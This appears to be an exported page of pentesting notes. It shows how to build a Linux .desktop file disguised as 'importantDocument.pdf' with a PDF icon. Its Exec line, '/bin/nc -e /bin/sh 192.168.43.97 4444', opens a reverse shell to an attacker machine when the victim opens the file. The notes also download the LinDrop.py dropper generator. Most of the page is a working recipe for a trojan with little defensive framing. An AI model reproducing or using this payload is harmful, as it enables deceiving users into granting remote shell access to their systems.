<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>malicious file with .desktop file vulnerability</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>malicious file with .desktop file vulnerability</h1><br /><strong>Manually generate malicious file
      with .desktop file vulnerability</strong><br />.desktop file in linux very similar to the shortcut .lnk file in
    Windows. Both allow us to create a shortcut to an application<br />
    <div class="codebox">
      <div class="codebox">cd&nbsp;home/kali/Desktop<br />touch&nbsp;test.desktop</div>
    </div> <br /><a href=""><img src="images/986-1.png" alt="images/986-1.png" /></a><br />
    <div class="codebox">
      <div class="codebox">
        locate&nbsp;*pdf.svg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#find&nbsp;on&nbsp;the&nbsp;pc&nbsp;a&nbsp;pdf&nbsp;icon&nbsp;for&nbsp;our&nbsp;file
      </div>
    </div><br />
    <div class="codebox">
      <div class="codebox">gedit&nbsp;test.desktop</div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        [Desktop&nbsp;Entry]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />Type=Application<br />Name=importantDocument.pdf<br />Exec=/bin/nc&nbsp;-e&nbsp;/bin/sh&nbsp;192.168.43.97&nbsp;4444<br />Icon=/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/gscan2pdf.svg
      </div>
    </div><br /> <a href=""><img src="images/986-2.png" alt="images/986-2.png" /></a><br /> <strong>[Desktop
      Entry]</strong> → field that tells us that this is a .desktop file but is not required for functioning<br />
    <strong>Type</strong> → specify the type of the .desktop file, there are 3 types that we can use: Application, Link,
    Directory<br /> <strong>Name</strong> → file name that will be showed to end user, &quot;test.desktop&quot; will be
    renamed to “importantDocument.pdf” and the .desktop will be hidden<br /> <strong>Exec</strong> → command that will
    be executed when the user will open the file<br /> <strong>Icon</strong> → path to the icon that the user will see,
    to see the icon the file must to be on the Desktop<br /> <a href=""><img src="images/986-3.png"
        alt="images/986-3.png" /></a><br />
    <div class="codebox">
      <div class="codebox">chmod&nbsp;+x&nbsp;test.desktop</div>
    </div><br /><br /><br /><strong>To create these files we can also use a script called: LinDrop.py</strong><br /><a
      href=""><img src="images/986-4.png" alt="images/986-4.png" /></a><br />GitHub site: <a
      href="https://github.com/secmode/LinDrop/blob/master/LinDrop.py" target="_blank">https://github.com/secmode/LinDrop/blob/master/LinDrop.py</a><br />explanation:
    <a
      href="https://www.obscurechannel.com/x42/lindrop.html" target="_blank">https://www.obscurechannel.com/x42/lindrop.html</a><br /><br />Script
    used to create malicious pdf file<br />Download script<br />
    <div class="codebox">
      <div class="codebox">
        cd&nbsp;/home/kali/bin<br />mkdir&nbsp;lindrop<br />cd&nbsp;lindrop<br />wget&nbsp;&quot;https://raw.githubusercontent.com/secmode/LinDrop/master/LinDrop.py&quot;
      </div>
    </div><br /><br /><br />
  </div>
</body>

</html>